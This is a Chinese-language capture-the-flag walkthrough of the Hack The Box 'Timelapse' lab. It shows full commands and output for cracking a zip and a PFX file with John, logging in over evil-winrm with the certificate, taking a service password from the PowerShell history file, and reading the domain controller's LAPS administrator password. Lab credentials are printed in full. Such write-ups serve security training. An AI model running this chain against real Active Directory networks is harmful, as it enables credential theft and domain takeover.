## Timelapse
### 总结
#### LAPS_Readers：有权限读取 LAPS 管理的本地管理员密码；
#### LAPS 的 PowerShell 模块：AdmPwd.PS，专门从 Active Directory 中读取 LAPS 存储的本地管理员密码
#### OU=Domain Controllers //组织单位（OU）
####   └── DC01$
#### LAPS 的密码存在 AD 里这个属性：ms-Mcs-AdmPwd，谁能读这个属性，由：ExtendedRightHolders，通过这个模块：AdmPwd.PS里面的命令：Find-AdmPwdExtendedRights
#### Find-AdmPwdExtendedRights= 查看谁能读取某台计算机 / OU 的 LAPS 管理员密码
#### 读取 PowerShell 历史记录文件的完整路径是什么？（从哪个路径开始$env:？）$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```
[★]$ zip2john winrm_backup.zip > zip.john
[★]$ john zip.john -wordlist:rockyou.txt
[★]$ unzip winrm_backup.zip
[★]$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out ket.pem -nodes //不行

利用pfx2john实用程序将pfx文件转换为散列格式
[★]$ python3 /usr/share/john/pfx2john.py legacyy_dev_auth.pfx > pfx.john
[★]$ john pfx.john -wordlist:rockyou.txt

[★]$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
[★]$ openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem 

【1】
[★]$ evil-winrm -i 10.129.227.113 -c cert.pem -k key.pem -S
*Evil-WinRM* PS C:\Users\legacyy\Documents> type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
【2】
[★]$ evil-winrm -i 10.129.227.113 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> net user svc_deploy //*LAPS_Readers
Local Group Memberships      *Remote Management Use
Global Group memberships     *LAPS_Readers         *Domain Users

【3】
LAPS_Readers组的一部分的LAPS （Local Administrator Password Solution）用于管理本地帐户的密码活动目录计算机。有一个PowerShell模块可以用来检索它密码可以在github上找到，名为AdmPwd.PS
[★]$ git clone https://github.com/ztrhgf/LAPS.git
[~/LAPS][★]$ evil-winrm -i 10.129.227.113 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S                                       *Evil-WinRM* PS C:\Users\svc_deploy\Documents> upload AdmPwd.PS
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Import-Module .\AdmPwd.PS\AdmPwd.PS.psd1
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Find-AdmPwdExtendedRights -Identity * //检查谁能读 LAPS 密码

Name                 DistinguishedName                                                 Status
----                 -----------------                                                 ------
Domain Controllers   OU=Domain Controllers,DC=timelapse,DC=htb                         Delegated
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Find-AdmPwdExtendedRights -identity 'Domain Controllers' | select-object ExtendedRightHolders //只显示“谁有权限”的那一列

ExtendedRightHolders
--------------------
{NT AUTHORITY\SYSTEM, TIMELAPSE\Domain Admins, TIMELAPSE\LAPS_Readers}

*Evil-WinRM* PS C:\Users\svc_deploy\Documents> get-admpwdpassword -computername dc01 | Select password

Password
--------
GZN/HA(;IeJlZH8B$m}kq/Js
【4】
[★]$ evil-winrm -i 10.129.227.113 -u administrator -p 'GZN/HA(;IeJlZH8B$m}kq/Js' -S
[★]$ evil-winrm -i 10.129.227.113 -u administrator -p 'GZN/HA(;IeJlZH8B$m}kq/Js' -S -s AdmPwd.PS/
*Evil-WinRM* PS C:\Users\Administrator> Get-ChildItem -Path C:\ -Filter root.txt -Recurse -ErrorAction SilentlyContinue
```
#### Get-ChildItem -Path C:\ -Filter root.txt -Recurse -ErrorAction SilentlyContinue
```
[★]$ nmap -sV -sC 10.129.227.113
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-02 02:25 CST
Nmap scan report for 10.129.227.113
Host is up (0.0093s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-02-02 16:26:00Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? //MSB协议
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 8h00m03s
| smb2-time: 
|   date: 2026-02-02T16:26:09
|_  start_date: N/A
```
#### 加入域名
```
[★]$ echo '10.129.227.113 timelapse.htb dc01.timelapse.htb' | sudo tee -a /etc/hosts
10.129.227.113 timelapse.htb dc01.timelapse.htb
```
```
[★]$ smbclient -L //10.129.227.113/
Password for [WORKGROUP\syareya55]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Shares          Disk      
	SYSVOL          Disk      Logon server share 
[★]$ smbclient  //10.129.227.113/Shares
Password for [WORKGROUP\syareya55]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Oct 25 10:39:15 2021
  ..                                  D        0  Mon Oct 25 10:39:15 2021
  Dev                                 D        0  Mon Oct 25 14:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 10:48:42 2021

		6367231 blocks of size 4096. 1277200 blocks available
smb: \> cd Dev\
smb: \Dev\> ls
  .                                   D        0  Mon Oct 25 14:40:06 2021
  ..                                  D        0  Mon Oct 25 14:40:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 10:46:42 2021

		6367231 blocks of size 4096. 1277200 blocks available
smb: \Dev\> get winrm_backup.zip
getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip (24.5 KiloBytes/sec) (average 24.5 KiloBytes/sec)
smb: \Dev\> exit
```
#### 我们找到两个名为Dev和HelpDesk的文件夹。在Dev文件夹中，我们找到一个名为Winrm_backup.zip。试图解压缩文件需要密码，而我们目前还没有的时刻。我们尝试用散列破解工具John破解密码，但首先我们使用Zip2john实用程序将zip转换为哈希格式。
```
[★]$ zip2john winrm_backup.zip > zip.john
Created directory: /home/syareya55/.john
ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 ts=72AA cs=72aa type=8

[★]$ ls /usr/share/wordlists/rockyou.txt.gz
/usr/share/wordlists/rockyou.txt.gz
[★]$ cp /usr/share/wordlists/rockyou.txt.gz .
[★]$ gunzip rockyou.txt.gz
[★]$ john zip.john -wordlist:rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)     
1g 0:00:00:00 DONE (2026-02-02 02:40) 3.125g/s 10854Kp/s 10854Kc/s 10854KC/s surkerior..superkebab
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
#### zip 文件密码是：supremelegacy 里面的文件是：legacyy_dev_auth.pfx
#### 输出是一个PFX文件，其中包含pkcs# 12格式的SSL证书和私钥。可以WinRM可以使用这些文件，以便无需密码即可登录。让我们从文件中提取它们。
```
[★]$ unzip winrm_backup.zip
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: //supremelegacy
  inflating: legacyy_dev_auth.pfx

[★]$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out ket.pem -nodes
Enter Import Password:
Mac verify error: invalid password? 
```
#### 上面的输出表明，我们需要一个不同于supermelegacy的密码。利用pfx2john实用程序将pfx文件转换为散列格式，然后使用John来破解密码。使用下面的命令，我们能够成功地破解密码可以文件。
#### 这个版本的 pfx2john 已经兼容 Python3 了
```
[★]$ python3 /usr/share/john/pfx2john.py legacyy_dev_auth.pfx > pfx.john
[★]$ john pfx.john -wordlist:rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
thuglegacy       (legacyy_dev_auth.pfx)     
1g 0:00:00:28 DONE (2026-02-02 02:52) 0.03460g/s 111825p/s 111825c/s 111825C/s thuglife06..thsco04
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

[★]$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
Enter Import Password:
[★]$ openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem 
Enter Import Password:
[★]$ ls
rockyou.txt     zip.john    pfx.john     cert.pem    key.pem  
```
### Exploitation 开发 Foothold
#### 由于我们已经解密了pfx文件并生成了一个有效的密钥和证书，我们可以尝试通过WinRM登录。在Nmap命令的输出中，我们可以看到端口5986是打开的，这是WinRM常用的，但使用SSL而不是未加密的连接。自Evil-WinRM允许我们使用-c和-k标志来传递密钥和证书，证书和密钥以及对目标的身份验证。
#### 登录后，我们执行一些手动枚举，以查看是否可以将权限升级为检查命令行历史记录。这样做会显示新的登录凭据。
```
[★]$ evil-winrm -i 10.129.227.113 -c cert.pem -k key.pem -S
                                        
Evil-WinRM shell v3.5

*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami
timelapse\legacyy

*Evil-WinRM* PS C:\Users\legacyy\Documents> type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
*Evil-WinRM* PS C:\Users\legacyy\Documents>
```
#### 使用新的凭据，我们可以使用以下命令通过Evil-WinRM登录
```
[★]$ evil-winrm -i 10.129.227.113 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami
timelapse\svc_deploy
*Evil-WinRM* PS C:\Users\svc_deploy\Documents>
//登录后，我们可以检查svc部署是哪个组的成员。
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> net user svc_deploy
User name                    svc_deploy
Full Name                    svc_deploy
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/25/2021 11:12:37 AM
Password expires             Never
Password changeable          10/26/2021 11:12:37 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   10/25/2021 11:25:53 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *LAPS_Readers         *Domain Users
The command completed successfully.
```
### Privilege Escalation
#### 前面命令的输出表明我们是LAPS_Readers组的一部分的LAPS （Local Administrator Password Solution）用于管理本地帐户的密码活动目录计算机。有一个PowerShell模块可以用来检索它密码可以在github上找到，名为AdmPwd.PS。可以通过Evil-WinRM上传使用以下命令
https://github.com/ztrhgf/LAPS/tree/master/AdmPwd.PS
```
[★]$ git clone https://github.com/ztrhgf/LAPS.git
[★]$ ls LAPS/AdmPwd.PS
AdmPwd.PS.dll  AdmPwd.PS.format.ps1xml  AdmPwd.PS.psd1  AdmPwd.Utils.dll  en-US

[★]$ cd LAPS
[~/LAPS][★]$ ls
AdmPwd.PS  Invoke-MSTSC.ps1  Send-LAPSPassword.ps1
AutoItX    README.md         Test-Connection2.ps1
[~/LAPS][★]$ evil-winrm -i 10.129.227.113 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
                                        
Evil-WinRM shell v3.5
                                        
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> upload AdmPwd.PS
*Evil-WinRM* PS C:\Users\svc_deploy\Documents>
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> ls AdmPwd.PS


    Directory: C:\Users\svc_deploy\Documents\AdmPwd.PS


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         2/2/2026   9:16 AM                en-US
-a----         1/1/2000  12:00 AM          31392 AdmPwd.PS.dll
-a----         1/1/2000  12:00 AM           5408 AdmPwd.PS.format.ps1xml
-a----         1/1/2000  12:00 AM           5074 AdmPwd.PS.psd1 //（哪个存在就用哪个）
-a----         1/1/2000  12:00 AM          33952 AdmPwd.Utils.dll


*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Import-Module .\AdmPwd.PS\AdmPwd.PS.psd1

//上传模块后，我们可以检查哪些对象可以使用下面的命令。
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Find-AdmPwdExtendedRights -Identity * //组织单位（OU）

Name                 DistinguishedName                                                 Status
----                 -----------------                                                 ------
Domain Controllers   OU=Domain Controllers,DC=timelapse,DC=htb                         Delegated
Servers              OU=Servers,DC=timelapse,DC=htb                                    Delegated
Database             OU=Database,OU=Servers,DC=timelapse,DC=htb                        Delegated
Web                  OU=Web,OU=Servers,DC=timelapse,DC=htb                             Delegated
Dev                  OU=Dev,OU=Servers,DC=timelapse,DC=htb                             Delegated
Staff                OU=Staff,DC=timelapse,DC=htb                                      Delegated
Admins               OU=Admins,OU=Staff,DC=timelapse,DC=htb                            Delegated
Dev                  OU=Dev,OU=Staff,DC=timelapse,DC=htb                               Delegated
HelpDesk             OU=HelpDesk,OU=Staff,DC=timelapse,DC=htb                          Delegated
Groups               OU=Groups,OU=Staff,DC=timelapse,DC=htb                            Delegated
More than one object found, search using distinguishedName instead
At line:1 char:1
+ Find-AdmPwdExtendedRights -Identity *
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Find-AdmPwdExtendedRights], AmbiguousResultException
    + FullyQualifiedErrorId : AdmPwd.PSTypes.AmbiguousResultException,AdmPwd.PS.FindExtendedRights
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> 
```
#### 从输出中我们可以看到域控制器。让我们看看权利人，看看我们是不是能够管理密码。我们通过使用下面的命令来做到这一点
```
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Find-AdmPwdExtendedRights -identity 'Domain Controllers' | select-object ExtendedRightHolders

ExtendedRightHolders
--------------------
{NT AUTHORITY\SYSTEM, TIMELAPSE\Domain Admins, TIMELAPSE\LAPS_Readers}

```
#### 前一个命令的输出表明LAPS_Readers组具有委托权限域控制器，它允许我们读取此对象中用户的密码。我们检索使用如下命令设置密码。
```
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> get-admpwdpassword -computername dc01 | Select password

Password
--------
GZN/HA(;IeJlZH8B$m}kq/Js
```
#### 我们尝试使用下面的新凭证通过Evil-WinRM进行身份验证命令。
```
[★]$ evil-winrm -i 10.129.227.113 -u administrator -p 'GZN/HA(;IeJlZH8B$m}kq/Js' -S
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
timelapse\administrator
```
#### 另外一个
```
[★]$ evil-winrm -i 10.129.227.113 -u administrator -p 'GZN/HA(;IeJlZH8B$m}kq/Js' -S -s AdmPwd.PS/
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
timelapse\administrator

*Evil-WinRM* PS C:\Users\legacyy> type Desktop\user.txt

*Evil-WinRM* PS C:\Users\Administrator> Get-ChildItem -Path C:\ -Filter root.txt -Recurse -ErrorAction SilentlyContinue


    Directory: C:\Users\TRX\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         2/2/2026   8:23 AM             34 root.txt

*Evil-WinRM* PS C:\Users\TRX\Desktop> type root.txt
```
#### Get-ChildItem 相当于PowerShell 的“万能 ls”
#### -Recurse 递归搜索：一层一层往下翻
#### -ErrorAction SilentlyContinue 遇到：“拒绝访问” “系统目录进不去” 权限不足 就：悄悄跳过继续找
